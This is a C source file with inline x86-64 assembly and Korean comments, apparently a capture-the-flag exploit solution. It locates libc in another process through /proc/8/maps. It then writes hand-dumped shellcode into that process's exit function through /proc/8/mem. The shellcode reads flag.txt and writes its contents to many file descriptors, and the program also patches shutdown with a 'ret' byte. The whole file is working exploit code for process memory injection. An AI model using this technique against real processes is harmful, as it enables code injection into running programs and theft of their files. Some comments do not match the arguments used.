#include <sys/mman.h>
#include <linux/memfd.h>
#include <fcntl.h>
#include <sys/syscall.h>


void inject(){
	char buf[0x100];
	int fd;
	char flag[] = "flag.txt";
	asm("lea rdi, [%0];"::"r"(flag));
    asm("mov esi, 0");    
    asm("mov eax, 2");
    asm("syscall"); //open(flag, 0)
	asm("mov [%0], eax"::"r"(&fd):"eax");
	asm("mov edi, %0;"::"r"(fd));
	asm("lea rsi, [%0];"::"r"(buf));
	asm("mov edx, 0x100");
	asm("mov eax, 0;");
	asm("syscall;");//read(fd, buf, 0x100)		
	for (int i = 6; i < 100; i++){
		asm("mov edi, %0;"::"r"(i));
		asm("lea rsi, [%0]"::"r"(buf));    
		asm("mov edx, 0x100");
		asm("mov eax, 1");
		asm("syscall"); //write(i, buf, 0x100)
	}
}

void main(){        
    const int MMAP = 9;
    const int WRITE = 1;
    int result;        
    char maps[] = "/proc/8/maps";
    char mem[] = "/proc/8/mem";    
    char buf[0x1000];
	//inject 함수를 덤프한 쉘코드
	char code[] = "\x55\x48\x89\xe5\x48\x81\xec\xa8\x0\x0\x0\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x48\x89\x85\xe3\xfe\xff\xff\xc6\x85\xeb\xfe\xff\xff\x0\x48\x8d\x85\xe3\xfe\xff\xff\x48\x8d\x38\xbe\x0\x0\x0\x0\xb8\x2\x0\x0\x0\xf\x5\x48\x8d\x95\xec\xfe\xff\xff\x89\x2\x8b\x85\xec\xfe\xff\xff\x89\xc7\x48\x8d\x85\xf0\xfe\xff\xff\x48\x8d\x30\xba\x0\x1\x0\x0\xb8\x0\x0\x0\x0\xf\x5\xc7\x45\xfc\x3\x0\x0\x0\xeb\x1f\x8b\x45\xfc\x89\xc7\x48\x8d\x85\xf0\xfe\xff\xff\x48\x8d\x30\xba\x0\x1\x0\x0\xb8\x1\x0\x0\x0\xf\x5\x83\x45\xfc\x1\x83\x7d\xfc\x63\x7e\xdb\x90\x90\xc9";
    void* (*syscall)() = 0x4011d6;    
    asm("lea rdi, [%0];"::"r"(maps));
    asm("mov esi, 0");    
    asm("mov eax, 2");
    asm("syscall"); //open(maps, 0)
    asm("mov [%0], eax"::"r"(&result):"eax");
    asm("mov edi, %0;"::"r"(result));
    asm("mov esi, 0x1000;");
    asm("mov edx, 0;"); 
    asm("mov eax, 8;");
    asm("syscall");//lseek(result, 0x2000, 0)
	asm("mov edi, %0;"::"r"(result));
	asm("lea rsi, [%0];"::"r"(buf));
	asm("mov edx, 0x1000");
	asm("mov eax, 0;");
	asm("syscall;");//read(result, buf, 0x1000)		
	size_t addr = 0;
	for (int i = 0; i < 0x1000 - 8; i++){
		size_t* ptr = &buf[i];
		if (*ptr == 0x2e6f732e6362696c){			
			for(int j = 0; j < 12; j++){
				char* end = &buf[i - 0x50 - 19] + j;						
				//16진수를 정수로 변환
				if (*end >= 'a'){
					*end = *end - 'a' + 10;
				}
				else{
					*end -= '0' ;
				}
				addr += *end;
				addr <<= 4;
			}
			addr >>= 4;
			break;
		}
	}
	size_t exit_addr = addr + 0x455f0; //libc 파일에서 얻은 exit 함수의 오프셋
	size_t shudown_addr = addr + 0x0127b00;
	asm("lea rdi, [%0];"::"r"(mem));
    asm("mov esi, 2");    
    asm("mov eax, 2");
    asm("syscall"); //open(mem, 2)
    asm("mov [%0], eax"::"r"(&result):"eax"); //result = eax
    asm("mov edi, %0;"::"r"(result)); 
    asm("lea rsi, [%0];"::"r"(exit_addr));
    asm("mov edx, 0;"); 
    asm("mov eax, 8;");
    asm("syscall");//lseek(result, exit_addr, 0)    
	asm("mov edi, %0;"::"r"(result));
	asm("lea rsi, [%0]"::"r"(code));    
	asm("mov edx, 145");
	asm("mov eax, 1");
	asm("syscall"); //write(result, code, 138)
	code[0] = '\xc3'; //ret
	asm("mov edi, %0;"::"r"(result)); 
    asm("lea rsi, [%0];"::"r"(shudown_addr));
    asm("mov edx, 0;"); 
    asm("mov eax, 8;");
    asm("syscall");//lseek(result, shudown_addr, 0)    
	asm("mov edi, %0;"::"r"(result));
	asm("lea rsi, [%0]"::"r"(code));    
	asm("mov edx, 1");
	asm("mov eax, 1"); //write(result, code, 1)
	asm("syscall");
}
